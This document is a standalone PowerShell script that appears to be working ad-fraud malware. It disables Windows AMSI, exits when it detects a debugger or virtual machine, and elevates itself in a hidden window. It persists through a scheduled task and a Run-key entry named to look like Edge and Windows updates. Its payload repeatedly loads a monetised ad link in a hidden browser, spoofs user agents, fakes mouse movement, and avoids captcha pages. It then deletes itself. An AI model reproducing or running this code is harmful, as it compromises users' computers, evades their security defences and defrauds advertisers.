$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'
try{[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").GetValue($null),0x01)}catch{}
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]0)}catch{}
if([System.Diagnostics.Debugger]::IsAttached){exit}
$vmProcs=@('vboxservice','vboxtray','vmwaretray','vmtoolsd','xenservice')
foreach($p in $vmProcs){if(Get-Process $p -EA 0){exit}}
if((Get-WmiObject Win32_ComputerSystem).Model -like "*Virtual*"){exit}
$isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if(-not $isAdmin){
    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName="powershell.exe"
    $psi.Arguments="-NoP -NonI -W Hidden -Exec Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    $psi.Verb="runas"
    [System.Diagnostics.Process]::Start($psi)|Out-Null;exit
}
$smartlink="https://www.profitablecpmratenetwork.com/ui63ybej16?key=65bc28f91ecb56970211c61fc28fd009"
$lockPath="$env:APPDATA\Microsoft\Windows\swill.lock"
if(Test-Path $lockPath){exit}
New-Item $lockPath -Force|Out-Null
$regPath="HKCU:\Software\Microsoft\Internet Explorer\Main"
Set-ItemProperty -Path $regPath -Name "DisableFirstRunCustomize" -Value 1 -Force -EA 0
Set-ItemProperty -Path $regPath -Name "DisableWelcomeScreen" -Value 1 -Force -EA 0
$userAgents=@(
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
)
function Humanize {
    Start-Sleep -Milliseconds (Get-Random -Min 500 -Max 3000)
    try{
        if(Get-Command Add-Type -EA 0){
            Add-Type -AssemblyName System.Windows.Forms -EA 0
            $x=Get-Random -Min 100 -Max 800
            $y=Get-Random -Min 100 -Max 600
            [System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point($x,$y)
        }
    }catch{}
}
function ContainsCaptcha($text){
    if(-not $text){return $false}
    $patterns=@('captcha','robot','verify','recaptcha','challenge','human','verification')
    foreach($p in $patterns){if($text -match $p){return $true}}
    return $false
}
function Open-Smartlink {
    try{
        $ie=New-Object -ComObject InternetExplorer.Application
        if(-not $ie){throw}
        $ie.Visible=$false
        $ie.Silent=$true
        $ie.Navigate($smartlink)
        $timeout=0
        while($ie.ReadyState -ne 4 -and $timeout -lt 60){
            Start-Sleep -Milliseconds 500
            $timeout++
        }
        if($ie.Document -and $ie.Document.body -and $ie.Document.body.innerHTML){
            if(ContainsCaptcha $ie.Document.body.innerHTML){
                $ie.Quit()
                [System.Runtime.Interopservices.Marshal]::ReleaseComObject($ie)|Out-Null
                Start-Sleep -Seconds (Get-Random -Min 300 -Max 600)
                return
            }
        }
        Humanize
        Start-Sleep -Milliseconds (Get-Random -Min 5000 -Max 15000)
        $ie.Quit()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($ie)|Out-Null
    }catch{}
    try{
        $wc=New-Object Net.WebClient
        $wc.Headers.Add("User-Agent",$userAgents[(Get-Random -Min 0 -Max $userAgents.Length)])
        $html=$wc.DownloadString($smartlink)
        if(ContainsCaptcha $html){
            Start-Sleep -Seconds (Get-Random -Min 300 -Max 600)
        }
    }catch{}
}
$randNum=Get-Random -Min 1000 -Max 9999
$persistScript="@
`$ErrorActionPreference='SilentlyContinue'
`$url='$smartlink'
`$agents=@('$($userAgents -join "','")')
function H{
    Start-Sleep -Milliseconds (Get-Random -Min 500 -Max 3000)
    try{
        if(Get-Command Add-Type -EA 0){
            Add-Type -AssemblyName System.Windows.Forms -EA 0
            `$x=Get-Random -Min 100 -Max 800
            `$y=Get-Random -Min 100 -Max 600
            [System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(`$x,`$y)
        }
    }catch{}
}
function C(`$t){
    if(-not `$t){return `$false}
    `$p=@('captcha','robot','verify','recaptcha','challenge','human','verification')
    foreach(`$q in `$p){if(`$t -match `$q){return `$true}}
    return `$false
}
while(`$true){
    try{
        `$ie=New-Object -ComObject InternetExplorer.Application
        if(`$ie){
            `$ie.Visible=`$false
            `$ie.Silent=`$true
            `$ie.Navigate(`$url)
            `$timeout=0
            while(`$ie.ReadyState -ne 4 -and `$timeout -lt 60){
                Start-Sleep -Milliseconds 500
                `$timeout++
            }
            if(`$ie.Document -and `$ie.Document.body -and `$ie.Document.body.innerHTML){
                if(C `$ie.Document.body.innerHTML){
                    `$ie.Quit()
                    [System.Runtime.Interopservices.Marshal]::ReleaseComObject(`$ie)|Out-Null
                    Start-Sleep -Seconds (Get-Random -Min 300 -Max 600)
                    continue
                }
            }
            H
            Start-Sleep -Milliseconds (Get-Random -Min 5000 -Max 15000)
            `$ie.Quit()
            [System.Runtime.Interopservices.Marshal]::ReleaseComObject(`$ie)|Out-Null
        }
    }catch{}
    try{
        `$wc=New-Object Net.WebClient
        `$wc.Headers.Add('User-Agent',`$agents[(Get-Random -Min 0 -Max `$agents.Length)])
        `$html=`$wc.DownloadString(`$url)
        if(C `$html){
            Start-Sleep -Seconds (Get-Random -Min 300 -Max 600)
        }
    }catch{}
    Start-Sleep -Seconds (Get-Random -Min 45 -Max 180)
}
"
$persistPath="$env:APPDATA\Microsoft\Windows\p_$randNum.ps1"
$persistScript|Out-File $persistPath -Encoding ASCII -Force
schtasks /create /tn "MicrosoftEdgeUpdate_$randNum" /tr "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$persistPath`"" /sc onstart /ru SYSTEM /f 2>$null
if($LASTEXITCODE -ne 0){
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate_$randNum" -Value "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$persistPath`"" -Force -EA 0
}
Open-Smartlink
Get-ChildItem "$env:TEMP\svc*.ps1" -EA 0|Remove-Item -Force -EA 0
Remove-Item $MyInvocation.MyCommand.Path -Force -EA 0
